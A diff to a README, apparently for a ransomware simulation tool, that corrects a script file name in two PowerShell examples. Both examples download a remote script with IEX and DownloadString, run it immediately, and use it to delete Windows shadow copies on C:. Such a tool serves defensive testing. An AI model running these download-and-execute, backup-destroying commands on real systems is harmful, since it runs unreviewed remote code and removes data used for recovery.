@@ -34,7 +34,7 @@ an aggregation of technique as implemented by ransomware groups to delete shadow
 
 Example ('All','VssDeleteAll', 'WmiDeleteAll', 'VssResize', 'DeleteEach', 'CimDelete', 'NativeDelete'):
 
-PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-ShadowDeleteSIM"); Invoke-ShadowDeleteSIM -Mode All -Volume 'C:\\'
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-ShadowDeleteSIM.ps1"); Invoke-ShadowDeleteSIM -Mode All -Volume 'C:\\'
 
-PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-ShadowDeleteSIM"); Invoke-ShadowDeleteSIM -Mode VssDeleteAll -Volume 'C:\\'
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-ShadowDeleteSIM.ps1"); Invoke-ShadowDeleteSIM -Mode VssDeleteAll -Volume 'C:\\'
 
